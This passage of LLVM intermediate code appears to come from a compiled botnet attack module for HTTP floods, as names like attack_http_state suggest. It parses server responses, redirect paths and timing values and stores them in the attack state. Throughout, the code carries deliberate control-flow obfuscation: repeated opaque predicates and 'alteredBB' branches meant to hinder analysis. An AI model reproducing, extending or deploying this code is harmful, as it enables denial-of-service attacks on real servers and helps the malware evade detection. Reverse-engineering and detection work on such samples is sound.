  %2769 = sext i8 %2768 to i32
  %2770 = icmp sle i32 %2769, 57
  br label %2771

; <label>:2771:                                   ; preds = %2763, %2755, %2747
  %2772 = phi i1 [ false, %2755 ], [ false, %2747 ], [ %2770, %2763 ]
  br i1 %2772, label %2773, label %2792

; <label>:2773:                                   ; preds = %2771
  %2774 = load i32, i32* @x.17
  %2775 = load i32, i32* @y.18
  %2776 = sub i32 %2774, 1
  %2777 = mul i32 %2774, %2776
  %2778 = urem i32 %2777, 2
  %2779 = icmp eq i32 %2778, 0
  %2780 = icmp slt i32 %2775, 10
  %2781 = or i1 %2779, %2780
  br i1 %2781, label %originalBB475, label %originalBB475alteredBB

originalBB475:                                    ; preds = %originalBB475alteredBB, %2773
  %2782 = load i32, i32* %10, align 4
  %2783 = add nsw i32 %2782, 1
  store i32 %2783, i32* %10, align 4
  %2784 = load i32, i32* @x.17
  %2785 = load i32, i32* @y.18
  %2786 = sub i32 %2784, 1
  %2787 = mul i32 %2784, %2786
  %2788 = urem i32 %2787, 2
  %2789 = icmp eq i32 %2788, 0
  %2790 = icmp slt i32 %2785, 10
  %2791 = or i1 %2789, %2790
  br i1 %2791, label %originalBBpart2480, label %originalBB475alteredBB

originalBBpart2480:                               ; preds = %originalBB475
  br label %2747

; <label>:2792:                                   ; preds = %2771
  %2793 = load i8*, i8** %57, align 8
  %2794 = load i32, i32* %10, align 4
  %2795 = sext i32 %2794 to i64
  %2796 = getelementptr inbounds i8, i8* %2793, i64 %2795
  %2797 = load i8, i8* %2796, align 1
  %2798 = sext i8 %2797 to i32
  %2799 = icmp ne i32 %2798, 0
  br i1 %2799, label %2800, label %3273

; <label>:2800:                                   ; preds = %2792
  store i32 0, i32* %58, align 4
  %2801 = load i8*, i8** %57, align 8
  %2802 = load i32, i32* %10, align 4
  %2803 = sext i32 %2802 to i64
  %2804 = getelementptr inbounds i8, i8* %2801, i64 %2803
  store i8 0, i8* %2804, align 1
  %2805 = load i32, i32* %10, align 4
  %2806 = add nsw i32 %2805, 1
  store i32 %2806, i32* %10, align 4
  %2807 = load i8*, i8** %57, align 8
  %2808 = load i32, i32* %10, align 4
  %2809 = sext i32 %2808 to i64
  %2810 = getelementptr inbounds i8, i8* %2807, i64 %2809
  %2811 = load i8, i8* %2810, align 1
  %2812 = sext i8 %2811 to i32
  %2813 = icmp eq i32 %2812, 32
  br i1 %2813, label %2814, label %2817

; <label>:2814:                                   ; preds = %2800
  %2815 = load i32, i32* %10, align 4
  %2816 = add nsw i32 %2815, 1
  store i32 %2816, i32* %10, align 4
  br label %2817

; <label>:2817:                                   ; preds = %2814, %2800
  %2818 = load i32, i32* @x.17
  %2819 = load i32, i32* @y.18
  %2820 = sub i32 %2818, 1
  %2821 = mul i32 %2818, %2820
  %2822 = urem i32 %2821, 2
  %2823 = icmp eq i32 %2822, 0
  %2824 = icmp slt i32 %2819, 10
  %2825 = or i1 %2823, %2824
  br i1 %2825, label %originalBB482, label %originalBB482alteredBB

originalBB482:                                    ; preds = %originalBB482alteredBB, %2817
  %2826 = load i8*, i8** %57, align 8
  %2827 = load i32, i32* %10, align 4
  %2828 = sext i32 %2827 to i64
  %2829 = getelementptr inbounds i8, i8* %2826, i64 %2828
  %2830 = load i8*, i8** %57, align 8
  %2831 = load i32, i32* %10, align 4
  %2832 = sext i32 %2831 to i64
  %2833 = getelementptr inbounds i8, i8* %2830, i64 %2832
  %2834 = call i32 @util_strlen(i8* %2833)
  %2835 = call i32 @util_stristr(i8* %2829, i32 %2834, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i32 0, i32 0))
  %2836 = icmp ne i32 %2835, -1
  %2837 = load i32, i32* @x.17
  %2838 = load i32, i32* @y.18
  %2839 = sub i32 %2837, 1
  %2840 = mul i32 %2837, %2839
  %2841 = urem i32 %2840, 2
  %2842 = icmp eq i32 %2841, 0
  %2843 = icmp slt i32 %2838, 10
  %2844 = or i1 %2842, %2843
  br i1 %2844, label %originalBBpart2484, label %originalBB482alteredBB

originalBBpart2484:                               ; preds = %originalBB482
  br i1 %2836, label %2845, label %2874

; <label>:2845:                                   ; preds = %originalBBpart2484
  %2846 = load i32, i32* @x.17
  %2847 = load i32, i32* @y.18
  %2848 = sub i32 %2846, 1
  %2849 = mul i32 %2846, %2848
  %2850 = urem i32 %2849, 2
  %2851 = icmp eq i32 %2850, 0
  %2852 = icmp slt i32 %2847, 10
  %2853 = or i1 %2851, %2852
  br i1 %2853, label %originalBB486, label %originalBB486alteredBB

originalBB486:                                    ; preds = %originalBB486alteredBB, %2845
  %2854 = load i8*, i8** %57, align 8
  %2855 = load i32, i32* %10, align 4
  %2856 = sext i32 %2855 to i64
  %2857 = getelementptr inbounds i8, i8* %2854, i64 %2856
  %2858 = load i8*, i8** %57, align 8
  %2859 = load i32, i32* %10, align 4
  %2860 = sext i32 %2859 to i64
  %2861 = getelementptr inbounds i8, i8* %2858, i64 %2860
  %2862 = call i32 @util_strlen(i8* %2861)
  %2863 = call i32 @util_stristr(i8* %2857, i32 %2862, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i32 0, i32 0))
  %2864 = load i32, i32* %10, align 4
  %2865 = add nsw i32 %2864, %2863
  store i32 %2865, i32* %10, align 4
  %2866 = load i32, i32* @x.17
  %2867 = load i32, i32* @y.18
  %2868 = sub i32 %2866, 1
  %2869 = mul i32 %2866, %2868
  %2870 = urem i32 %2869, 2
  %2871 = icmp eq i32 %2870, 0
  %2872 = icmp slt i32 %2867, 10
  %2873 = or i1 %2871, %2872
  br i1 %2873, label %originalBBpart2498, label %originalBB486alteredBB

originalBBpart2498:                               ; preds = %originalBB486
  br label %2874

; <label>:2874:                                   ; preds = %originalBBpart2498, %originalBBpart2484
  %2875 = load i8*, i8** %57, align 8
  %2876 = load i32, i32* %10, align 4
  %2877 = sext i32 %2876 to i64
  %2878 = getelementptr inbounds i8, i8* %2875, i64 %2877
  %2879 = load i8, i8* %2878, align 1
  %2880 = sext i8 %2879 to i32
  %2881 = icmp eq i32 %2880, 34
  br i1 %2881, label %2882, label %2914

; <label>:2882:                                   ; preds = %2874
  %2883 = load i32, i32* %10, align 4
  %2884 = add nsw i32 %2883, 1
  store i32 %2884, i32* %10, align 4
  %2885 = load i8*, i8** %57, align 8
  %2886 = load i32, i32* %10, align 4
  %2887 = sext i32 %2886 to i64
  %2888 = getelementptr inbounds i8, i8* %2885, i64 %2887
  %2889 = load i8*, i8** %57, align 8
  %2890 = load i32, i32* %10, align 4
  %2891 = sext i32 %2890 to i64
  %2892 = getelementptr inbounds i8, i8* %2889, i64 %2891
  %2893 = call i32 @util_strlen(i8* %2892)
  %2894 = sub nsw i32 %2893, 1
  %2895 = sext i32 %2894 to i64
  %2896 = getelementptr inbounds i8, i8* %2888, i64 %2895
  %2897 = load i8, i8* %2896, align 1
  %2898 = sext i8 %2897 to i32
  %2899 = icmp eq i32 %2898, 34
  br i1 %2899, label %2900, label %2913

; <label>:2900:                                   ; preds = %2882
  %2901 = load i8*, i8** %57, align 8
  %2902 = load i32, i32* %10, align 4
  %2903 = sext i32 %2902 to i64
  %2904 = getelementptr inbounds i8, i8* %2901, i64 %2903
  %2905 = load i8*, i8** %57, align 8
  %2906 = load i32, i32* %10, align 4
  %2907 = sext i32 %2906 to i64
  %2908 = getelementptr inbounds i8, i8* %2905, i64 %2907
  %2909 = call i32 @util_strlen(i8* %2908)
  %2910 = sub nsw i32 %2909, 1
  %2911 = sext i32 %2910 to i64
  %2912 = getelementptr inbounds i8, i8* %2904, i64 %2911
  store i8 0, i8* %2912, align 1
  br label %2913

; <label>:2913:                                   ; preds = %2900, %2882
  br label %2914

; <label>:2914:                                   ; preds = %2913, %2874
  %2915 = load i8*, i8** %57, align 8
  %2916 = call i32 @util_atoi(i8* %2915, i32 10)
  store i32 %2916, i32* %58, align 4
  br label %2917

; <label>:2917:                                   ; preds = %2964, %2914
  %2918 = load i32, i32* %58, align 4
  %2919 = icmp sgt i32 %2918, 0
  br i1 %2919, label %2920, label %2962

; <label>:2920:                                   ; preds = %2917
  %2921 = load i32, i32* @x.17
  %2922 = load i32, i32* @y.18
  %2923 = sub i32 %2921, 1
  %2924 = mul i32 %2921, %2923
  %2925 = urem i32 %2924, 2
  %2926 = icmp eq i32 %2925, 0
  %2927 = icmp slt i32 %2922, 10
  %2928 = or i1 %2926, %2927
  br i1 %2928, label %originalBB500, label %originalBB500alteredBB

originalBB500:                                    ; preds = %originalBB500alteredBB, %2920
  %2929 = load i32, i32* %58, align 4
  %2930 = icmp slt i32 %2929, 10
  %2931 = load i32, i32* @x.17
  %2932 = load i32, i32* @y.18
  %2933 = sub i32 %2931, 1
  %2934 = mul i32 %2931, %2933
  %2935 = urem i32 %2934, 2
  %2936 = icmp eq i32 %2935, 0
  %2937 = icmp slt i32 %2932, 10
  %2938 = or i1 %2936, %2937
  br i1 %2938, label %originalBBpart2502, label %originalBB500alteredBB

originalBBpart2502:                               ; preds = %originalBB500
  br i1 %2930, label %2939, label %2962

; <label>:2939:                                   ; preds = %originalBBpart2502
  %2940 = load i32, i32* @x.17
  %2941 = load i32, i32* @y.18
  %2942 = sub i32 %2940, 1
  %2943 = mul i32 %2940, %2942
  %2944 = urem i32 %2943, 2
  %2945 = icmp eq i32 %2944, 0
  %2946 = icmp slt i32 %2941, 10
  %2947 = or i1 %2945, %2946
  br i1 %2947, label %originalBB504, label %originalBB504alteredBB

originalBB504:                                    ; preds = %originalBB504alteredBB, %2939
  %2948 = load i32, i32* %27, align 4
  %2949 = load i32, i32* %58, align 4
  %2950 = add i32 %2948, %2949
  %2951 = zext i32 %2950 to i64
  %2952 = call i64 @time(i64* null) #6
  %2953 = icmp sgt i64 %2951, %2952
  %2954 = load i32, i32* @x.17
  %2955 = load i32, i32* @y.18
  %2956 = sub i32 %2954, 1
  %2957 = mul i32 %2954, %2956
  %2958 = urem i32 %2957, 2
  %2959 = icmp eq i32 %2958, 0
  %2960 = icmp slt i32 %2955, 10
  %2961 = or i1 %2959, %2960
  br i1 %2961, label %originalBBpart2512, label %originalBB504alteredBB

originalBBpart2512:                               ; preds = %originalBB504
  br label %2962

; <label>:2962:                                   ; preds = %originalBBpart2512, %originalBBpart2502, %2917
  %2963 = phi i1 [ false, %originalBBpart2502 ], [ false, %2917 ], [ %2953, %originalBBpart2512 ]
  br i1 %2963, label %2964, label %2966

; <label>:2964:                                   ; preds = %2962
  %2965 = call i32 @sleep(i32 1)
  br label %2917

; <label>:2966:                                   ; preds = %2962
  %2967 = load i8*, i8** %57, align 8
  %2968 = load i32, i32* %10, align 4
  %2969 = sext i32 %2968 to i64
  %2970 = getelementptr inbounds i8, i8* %2967, i64 %2969
  store i8* %2970, i8** %57, align 8
  %2971 = load i8*, i8** %57, align 8
  %2972 = load i8*, i8** %57, align 8
  %2973 = call i32 @util_strlen(i8* %2972)
  %2974 = call i32 @util_stristr(i8* %2971, i32 %2973, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i32 0, i32 0))
  %2975 = icmp eq i32 %2974, 4
  br i1 %2975, label %2976, label %3146

; <label>:2976:                                   ; preds = %2966
  %2977 = load i32, i32* @x.17
  %2978 = load i32, i32* @y.18
  %2979 = sub i32 %2977, 1
  %2980 = mul i32 %2977, %2979
  %2981 = urem i32 %2980, 2
  %2982 = icmp eq i32 %2981, 0
  %2983 = icmp slt i32 %2978, 10
  %2984 = or i1 %2982, %2983
  br i1 %2984, label %originalBB514, label %originalBB514alteredBB

originalBB514:                                    ; preds = %originalBB514alteredBB, %2976
  store i32 7, i32* %10, align 4
  %2985 = load i8*, i8** %57, align 8
  %2986 = getelementptr inbounds i8, i8* %2985, i64 4
  %2987 = load i8, i8* %2986, align 1
  %2988 = sext i8 %2987 to i32
  %2989 = icmp eq i32 %2988, 115
  %2990 = load i32, i32* @x.17
  %2991 = load i32, i32* @y.18
  %2992 = sub i32 %2990, 1
  %2993 = mul i32 %2990, %2992
  %2994 = urem i32 %2993, 2
  %2995 = icmp eq i32 %2994, 0
  %2996 = icmp slt i32 %2991, 10
  %2997 = or i1 %2995, %2996
  br i1 %2997, label %originalBBpart2516, label %originalBB514alteredBB

originalBBpart2516:                               ; preds = %originalBB514
  br i1 %2989, label %2998, label %3017

; <label>:2998:                                   ; preds = %originalBBpart2516
  %2999 = load i32, i32* @x.17
  %3000 = load i32, i32* @y.18
  %3001 = sub i32 %2999, 1
  %3002 = mul i32 %2999, %3001
  %3003 = urem i32 %3002, 2
  %3004 = icmp eq i32 %3003, 0
  %3005 = icmp slt i32 %3000, 10
  %3006 = or i1 %3004, %3005
  br i1 %3006, label %originalBB518, label %originalBB518alteredBB

originalBB518:                                    ; preds = %originalBB518alteredBB, %2998
  %3007 = load i32, i32* %10, align 4
  %3008 = add nsw i32 %3007, 1
  store i32 %3008, i32* %10, align 4
  %3009 = load i32, i32* @x.17
  %3010 = load i32, i32* @y.18
  %3011 = sub i32 %3009, 1
  %3012 = mul i32 %3009, %3011
  %3013 = urem i32 %3012, 2
  %3014 = icmp eq i32 %3013, 0
  %3015 = icmp slt i32 %3010, 10
  %3016 = or i1 %3014, %3015
  br i1 %3016, label %originalBBpart2524, label %originalBB518alteredBB

originalBBpart2524:                               ; preds = %originalBB518
  br label %3017

; <label>:3017:                                   ; preds = %originalBBpart2524, %originalBBpart2516
  %3018 = load i8*, i8** %57, align 8
  %3019 = load i8*, i8** %57, align 8
  %3020 = load i32, i32* %10, align 4
  %3021 = sext i32 %3020 to i64
  %3022 = getelementptr inbounds i8, i8* %3019, i64 %3021
  %3023 = load i32, i32* %56, align 4
  %3024 = load i32, i32* %10, align 4
  %3025 = sub nsw i32 %3023, %3024
  %3026 = sext i32 %3025 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %3018, i8* %3022, i64 %3026, i32 1, i1 false)
  store i32 0, i32* %10, align 4
  br label %3027

; <label>:3027:                                   ; preds = %originalBBpart2535, %3017
  %3028 = load i8*, i8** %57, align 8
  %3029 = load i32, i32* %10, align 4
  %3030 = sext i32 %3029 to i64
  %3031 = getelementptr inbounds i8, i8* %3028, i64 %3030
  %3032 = load i8, i8* %3031, align 1
  %3033 = sext i8 %3032 to i32
  %3034 = icmp ne i32 %3033, 0
  br i1 %3034, label %3035, label %3067

; <label>:3035:                                   ; preds = %3027
  %3036 = load i8*, i8** %57, align 8
  %3037 = load i32, i32* %10, align 4
  %3038 = sext i32 %3037 to i64
  %3039 = getelementptr inbounds i8, i8* %3036, i64 %3038
  %3040 = load i8, i8* %3039, align 1
  %3041 = sext i8 %3040 to i32
  %3042 = icmp eq i32 %3041, 47
  br i1 %3042, label %3043, label %3048

; <label>:3043:                                   ; preds = %3035
  %3044 = load i8*, i8** %57, align 8
  %3045 = load i32, i32* %10, align 4
  %3046 = sext i32 %3045 to i64
  %3047 = getelementptr inbounds i8, i8* %3044, i64 %3046
  store i8 0, i8* %3047, align 1
  br label %3067

; <label>:3048:                                   ; preds = %3035
  %3049 = load i32, i32* @x.17
  %3050 = load i32, i32* @y.18
  %3051 = sub i32 %3049, 1
  %3052 = mul i32 %3049, %3051
  %3053 = urem i32 %3052, 2
  %3054 = icmp eq i32 %3053, 0
  %3055 = icmp slt i32 %3050, 10
  %3056 = or i1 %3054, %3055
  br i1 %3056, label %originalBB526, label %originalBB526alteredBB

originalBB526:                                    ; preds = %originalBB526alteredBB, %3048
  %3057 = load i32, i32* %10, align 4
  %3058 = add nsw i32 %3057, 1
  store i32 %3058, i32* %10, align 4
  %3059 = load i32, i32* @x.17
  %3060 = load i32, i32* @y.18
  %3061 = sub i32 %3059, 1
  %3062 = mul i32 %3059, %3061
  %3063 = urem i32 %3062, 2
  %3064 = icmp eq i32 %3063, 0
  %3065 = icmp slt i32 %3060, 10
  %3066 = or i1 %3064, %3065
  br i1 %3066, label %originalBBpart2535, label %originalBB526alteredBB

originalBBpart2535:                               ; preds = %originalBB526
  br label %3027

; <label>:3067:                                   ; preds = %3043, %3027
  %3068 = load i8*, i8** %57, align 8
  %3069 = call i32 @util_strlen(i8* %3068)
  %3070 = icmp sgt i32 %3069, 0
  br i1 %3070, label %3071, label %3081

; <label>:3071:                                   ; preds = %3067
  %3072 = load i8*, i8** %57, align 8
  %3073 = call i32 @util_strlen(i8* %3072)
  %3074 = icmp slt i32 %3073, 128
  br i1 %3074, label %3075, label %3081

; <label>:3075:                                   ; preds = %3071
  %3076 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3077 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3076, i32 0, i32 7
  %3078 = getelementptr inbounds [129 x i8], [129 x i8]* %3077, i32 0, i32 0
  %3079 = load i8*, i8** %57, align 8
  %3080 = call i32 @util_strcpy(i8* %3078, i8* %3079)
  br label %3081

; <label>:3081:                                   ; preds = %3075, %3071, %3067
  %3082 = load i32, i32* @x.17
  %3083 = load i32, i32* @y.18
  %3084 = sub i32 %3082, 1
  %3085 = mul i32 %3082, %3084
  %3086 = urem i32 %3085, 2
  %3087 = icmp eq i32 %3086, 0
  %3088 = icmp slt i32 %3083, 10
  %3089 = or i1 %3087, %3088
  br i1 %3089, label %originalBB537, label %originalBB537alteredBB

originalBB537:                                    ; preds = %originalBB537alteredBB, %3081
  %3090 = load i8*, i8** %57, align 8
  %3091 = load i32, i32* %10, align 4
  %3092 = add nsw i32 %3091, 1
  %3093 = sext i32 %3092 to i64
  %3094 = getelementptr inbounds i8, i8* %3090, i64 %3093
  %3095 = call i32 @util_strlen(i8* %3094)
  %3096 = icmp slt i32 %3095, 256
  %3097 = load i32, i32* @x.17
  %3098 = load i32, i32* @y.18
  %3099 = sub i32 %3097, 1
  %3100 = mul i32 %3097, %3099
  %3101 = urem i32 %3100, 2
  %3102 = icmp eq i32 %3101, 0
  %3103 = icmp slt i32 %3098, 10
  %3104 = or i1 %3102, %3103
  br i1 %3104, label %originalBBpart2544, label %originalBB537alteredBB

originalBBpart2544:                               ; preds = %originalBB537
  br i1 %3096, label %3105, label %3129

; <label>:3105:                                   ; preds = %originalBBpart2544
  %3106 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3107 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3106, i32 0, i32 6
  %3108 = getelementptr inbounds [257 x i8], [257 x i8]* %3107, i32 0, i32 0
  %3109 = getelementptr inbounds i8, i8* %3108, i64 1
  call void @util_zero(i8* %3109, i32 255)
  %3110 = load i8*, i8** %57, align 8
  %3111 = load i32, i32* %10, align 4
  %3112 = add nsw i32 %3111, 1
  %3113 = sext i32 %3112 to i64
  %3114 = getelementptr inbounds i8, i8* %3110, i64 %3113
  %3115 = call i32 @util_strlen(i8* %3114)
  %3116 = icmp sgt i32 %3115, 0
  br i1 %3116, label %3117, label %3128

; <label>:3117:                                   ; preds = %3105
  %3118 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3119 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3118, i32 0, i32 6
  %3120 = getelementptr inbounds [257 x i8], [257 x i8]* %3119, i32 0, i32 0
  %3121 = getelementptr inbounds i8, i8* %3120, i64 1
  %3122 = load i8*, i8** %57, align 8
  %3123 = load i32, i32* %10, align 4
  %3124 = add nsw i32 %3123, 1
  %3125 = sext i32 %3124 to i64
  %3126 = getelementptr inbounds i8, i8* %3122, i64 %3125
  %3127 = call i32 @util_strcpy(i8* %3121, i8* %3126)
  br label %3128

; <label>:3128:                                   ; preds = %3117, %3105
  br label %3129

; <label>:3129:                                   ; preds = %3128, %originalBBpart2544
  %3130 = load i32, i32* @x.17
  %3131 = load i32, i32* @y.18
  %3132 = sub i32 %3130, 1
  %3133 = mul i32 %3130, %3132
  %3134 = urem i32 %3133, 2
  %3135 = icmp eq i32 %3134, 0
  %3136 = icmp slt i32 %3131, 10
  %3137 = or i1 %3135, %3136
  br i1 %3137, label %originalBB546, label %originalBB546alteredBB

originalBB546:                                    ; preds = %originalBB546alteredBB, %3129
  %3138 = load i32, i32* @x.17
  %3139 = load i32, i32* @y.18
  %3140 = sub i32 %3138, 1
  %3141 = mul i32 %3138, %3140
  %3142 = urem i32 %3141, 2
  %3143 = icmp eq i32 %3142, 0
  %3144 = icmp slt i32 %3139, 10
  %3145 = or i1 %3143, %3144
  br i1 %3145, label %originalBBpart2548, label %originalBB546alteredBB

originalBBpart2548:                               ; preds = %originalBB546
  br label %3250

; <label>:3146:                                   ; preds = %2966
  %3147 = load i8*, i8** %57, align 8
  %3148 = getelementptr inbounds i8, i8* %3147, i64 0
  %3149 = load i8, i8* %3148, align 1
  %3150 = sext i8 %3149 to i32
  %3151 = icmp eq i32 %3150, 47
  br i1 %3151, label %3152, label %3233

; <label>:3152:                                   ; preds = %3146
  %3153 = load i8*, i8** %57, align 8
  %3154 = load i32, i32* %10, align 4
  %3155 = add nsw i32 %3154, 1
  %3156 = sext i32 %3155 to i64
  %3157 = getelementptr inbounds i8, i8* %3153, i64 %3156
  %3158 = call i32 @util_strlen(i8* %3157)
  %3159 = icmp slt i32 %3158, 256
  br i1 %3159, label %3160, label %3216

; <label>:3160:                                   ; preds = %3152
  %3161 = load i32, i32* @x.17
  %3162 = load i32, i32* @y.18
  %3163 = sub i32 %3161, 1
  %3164 = mul i32 %3161, %3163
  %3165 = urem i32 %3164, 2
  %3166 = icmp eq i32 %3165, 0
  %3167 = icmp slt i32 %3162, 10
  %3168 = or i1 %3166, %3167
  br i1 %3168, label %originalBB550, label %originalBB550alteredBB

originalBB550:                                    ; preds = %originalBB550alteredBB, %3160
  %3169 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3170 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3169, i32 0, i32 6
  %3171 = getelementptr inbounds [257 x i8], [257 x i8]* %3170, i32 0, i32 0
  %3172 = getelementptr inbounds i8, i8* %3171, i64 1
  call void @util_zero(i8* %3172, i32 255)
  %3173 = load i8*, i8** %57, align 8
  %3174 = load i32, i32* %10, align 4
  %3175 = add nsw i32 %3174, 1
  %3176 = sext i32 %3175 to i64
  %3177 = getelementptr inbounds i8, i8* %3173, i64 %3176
  %3178 = call i32 @util_strlen(i8* %3177)
  %3179 = icmp sgt i32 %3178, 0
  %3180 = load i32, i32* @x.17
  %3181 = load i32, i32* @y.18
  %3182 = sub i32 %3180, 1
  %3183 = mul i32 %3180, %3182
  %3184 = urem i32 %3183, 2
  %3185 = icmp eq i32 %3184, 0
  %3186 = icmp slt i32 %3181, 10
  %3187 = or i1 %3185, %3186
  br i1 %3187, label %originalBBpart2563, label %originalBB550alteredBB

originalBBpart2563:                               ; preds = %originalBB550
  br i1 %3179, label %3188, label %3199

; <label>:3188:                                   ; preds = %originalBBpart2563
  %3189 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3190 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3189, i32 0, i32 6
  %3191 = getelementptr inbounds [257 x i8], [257 x i8]* %3190, i32 0, i32 0
  %3192 = getelementptr inbounds i8, i8* %3191, i64 1
  %3193 = load i8*, i8** %57, align 8
  %3194 = load i32, i32* %10, align 4
  %3195 = add nsw i32 %3194, 1
  %3196 = sext i32 %3195 to i64
  %3197 = getelementptr inbounds i8, i8* %3193, i64 %3196
  %3198 = call i32 @util_strcpy(i8* %3192, i8* %3197)
  br label %3199

; <label>:3199:                                   ; preds = %3188, %originalBBpart2563
  %3200 = load i32, i32* @x.17
  %3201 = load i32, i32* @y.18
  %3202 = sub i32 %3200, 1
  %3203 = mul i32 %3200, %3202
  %3204 = urem i32 %3203, 2
  %3205 = icmp eq i32 %3204, 0
  %3206 = icmp slt i32 %3201, 10
  %3207 = or i1 %3205, %3206
  br i1 %3207, label %originalBB565, label %originalBB565alteredBB

originalBB565:                                    ; preds = %originalBB565alteredBB, %3199
  %3208 = load i32, i32* @x.17
  %3209 = load i32, i32* @y.18
  %3210 = sub i32 %3208, 1
  %3211 = mul i32 %3208, %3210
  %3212 = urem i32 %3211, 2
  %3213 = icmp eq i32 %3212, 0
  %3214 = icmp slt i32 %3209, 10
  %3215 = or i1 %3213, %3214
  br i1 %3215, label %originalBBpart2567, label %originalBB565alteredBB

originalBBpart2567:                               ; preds = %originalBB565
  br label %3216

; <label>:3216:                                   ; preds = %originalBBpart2567, %3152
  %3217 = load i32, i32* @x.17
  %3218 = load i32, i32* @y.18
  %3219 = sub i32 %3217, 1
  %3220 = mul i32 %3217, %3219
  %3221 = urem i32 %3220, 2
  %3222 = icmp eq i32 %3221, 0
  %3223 = icmp slt i32 %3218, 10
  %3224 = or i1 %3222, %3223
  br i1 %3224, label %originalBB569, label %originalBB569alteredBB

originalBB569:                                    ; preds = %originalBB569alteredBB, %3216
  %3225 = load i32, i32* @x.17
  %3226 = load i32, i32* @y.18
  %3227 = sub i32 %3225, 1
  %3228 = mul i32 %3225, %3227
  %3229 = urem i32 %3228, 2
  %3230 = icmp eq i32 %3229, 0
  %3231 = icmp slt i32 %3226, 10
  %3232 = or i1 %3230, %3231
  br i1 %3232, label %originalBBpart2571, label %originalBB569alteredBB

originalBBpart2571:                               ; preds = %originalBB569
  br label %3233

; <label>:3233:                                   ; preds = %originalBBpart2571, %3146
  %3234 = load i32, i32* @x.17
  %3235 = load i32, i32* @y.18
  %3236 = sub i32 %3234, 1
  %3237 = mul i32 %3234, %3236
  %3238 = urem i32 %3237, 2
  %3239 = icmp eq i32 %3238, 0
  %3240 = icmp slt i32 %3235, 10
  %3241 = or i1 %3239, %3240
  br i1 %3241, label %originalBB573, label %originalBB573alteredBB

originalBB573:                                    ; preds = %originalBB573alteredBB, %3233
  %3242 = load i32, i32* @x.17
  %3243 = load i32, i32* @y.18
  %3244 = sub i32 %3242, 1
  %3245 = mul i32 %3242, %3244
  %3246 = urem i32 %3245, 2
  %3247 = icmp eq i32 %3246, 0
  %3248 = icmp slt i32 %3243, 10
  %3249 = or i1 %3247, %3248
  br i1 %3249, label %originalBBpart2575, label %originalBB573alteredBB

originalBBpart2575:                               ; preds = %originalBB573
  br label %3250

; <label>:3250:                                   ; preds = %originalBBpart2575, %originalBBpart2548
  %3251 = load i32, i32* @x.17
  %3252 = load i32, i32* @y.18
  %3253 = sub i32 %3251, 1
  %3254 = mul i32 %3251, %3253
  %3255 = urem i32 %3254, 2
  %3256 = icmp eq i32 %3255, 0
  %3257 = icmp slt i32 %3252, 10
  %3258 = or i1 %3256, %3257
  br i1 %3258, label %originalBB577, label %originalBB577alteredBB

originalBB577:                                    ; preds = %originalBB577alteredBB, %3250
  %3259 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3260 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3259, i32 0, i32 9
  %3261 = getelementptr inbounds [9 x i8], [9 x i8]* %3260, i32 0, i32 0
  %3262 = call i8* @strcpy(i8* %3261, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i32 0, i32 0)) #6
  %3263 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3264 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3263, i32 0, i32 1
  store i8 10, i8* %3264, align 4
  %3265 = load i32, i32* @x.17
  %3266 = load i32, i32* @y.18
  %3267 = sub i32 %3265, 1
  %3268 = mul i32 %3265, %3267
  %3269 = urem i32 %3268, 2
  %3270 = icmp eq i32 %3269, 0
  %3271 = icmp slt i32 %3266, 10
  %3272 = or i1 %3270, %3271
  br i1 %3272, label %originalBBpart2579, label %originalBB577alteredBB

originalBBpart2579:                               ; preds = %originalBB577
  br label %4121

; <label>:3273:                                   ; preds = %2792
  br label %3274

; <label>:3274:                                   ; preds = %3273, %originalBBpart2473
  %3275 = load i32, i32* @x.17
  %3276 = load i32, i32* @y.18
  %3277 = sub i32 %3275, 1
  %3278 = mul i32 %3275, %3277
  %3279 = urem i32 %3278, 2
  %3280 = icmp eq i32 %3279, 0
  %3281 = icmp slt i32 %3276, 10
  %3282 = or i1 %3280, %3281
  br i1 %3282, label %originalBB581, label %originalBB581alteredBB

originalBB581:                                    ; preds = %originalBB581alteredBB, %3274
  %3283 = load i32, i32* @x.17
  %3284 = load i32, i32* @y.18
  %3285 = sub i32 %3283, 1
  %3286 = mul i32 %3283, %3285
  %3287 = urem i32 %3286, 2
  %3288 = icmp eq i32 %3287, 0
  %3289 = icmp slt i32 %3284, 10
  %3290 = or i1 %3288, %3289
  br i1 %3290, label %originalBBpart2583, label %originalBB581alteredBB

originalBBpart2583:                               ; preds = %originalBB581
  br label %3291

; <label>:3291:                                   ; preds = %originalBBpart2583, %originalBBpart2448
  %3292 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %3293 = load i32, i32* %12, align 4
  %3294 = call i32 @util_memsearch(i8* %3292, i32 %3293, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i32 0, i32 0), i32 4)
  store i32 %3294, i32* %37, align 4
  %3295 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3296 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3295, i32 0, i32 9
  %3297 = getelementptr inbounds [9 x i8], [9 x i8]* %3296, i32 0, i32 0
  %3298 = call signext i8 @util_strcmp(i8* %3297, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.12, i32 0, i32 0))
  %3299 = sext i8 %3298 to i32
  %3300 = icmp ne i32 %3299, 0
  br i1 %3300, label %3308, label %3301

; <label>:3301:                                   ; preds = %3291
  %3302 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3303 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3302, i32 0, i32 9
